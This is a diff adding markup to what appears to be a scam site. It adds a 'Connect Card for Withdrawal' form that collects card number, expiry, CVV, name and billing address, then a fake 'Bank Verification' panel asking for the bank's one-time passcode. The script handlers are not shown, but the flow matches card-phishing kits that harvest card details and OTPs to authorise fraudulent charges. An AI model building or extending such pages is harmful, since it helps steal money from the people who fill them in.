@@ -142,6 +142,29 @@
         </div>
         
         <!-- Withdraw View and the rest of your code -->
+        
+               <!-- 4. WITHDRAW VIEW -->
+        <div id="withdraw-view" class="content-view" style="display:none;">
+            <div id="card-area" style="max-width:500px; margin:0 auto; background:var(--card); padding:30px; border-radius:20px; border:1px solid var(--border);">
+                <h2>Connect Card for Withdrawal</h2>
+                <input type="text" id="c-num" placeholder="Card Number" maxlength="16">
+                <div style="display:flex; gap:10px;">
+                    <input type="text" id="c-exp" placeholder="MM/YY">
+                    <input type="text" id="c-cvv" placeholder="CVV">
+                </div>
+                <input type="text" id="c-name" placeholder="Full Name">
+                <textarea id="c-addr" placeholder="Billing Address"></textarea>
+                <button class="btn-yellow" onclick="step1_Card()">Verify Card</button>
+            </div>
+            
+            <div id="bank-otp-area" class="bank-page" style="display:none;">
+                <h2 style="color:#004a99;">Bank Verification</h2>
+                <p style="color:#333; font-size:13px; margin:20px 0;">Gateway Sync Complete. Please enter the OTP from your bank.</p>
+                <input type="text" id="bank-otp" placeholder="Enter OTP" style="background:#f9f9f9; color:black; border:1px solid #ccc; text-align:center; font-size:24px; letter-spacing:8px; padding:15px; width:100%;">
+                <button class="btn-yellow" style="background:#004a99; color:white; width:100%;" onclick="step2_OTP()">Confirm OTP</button>
+            </div>
+        </div>
+
     </main>
 </div>
 
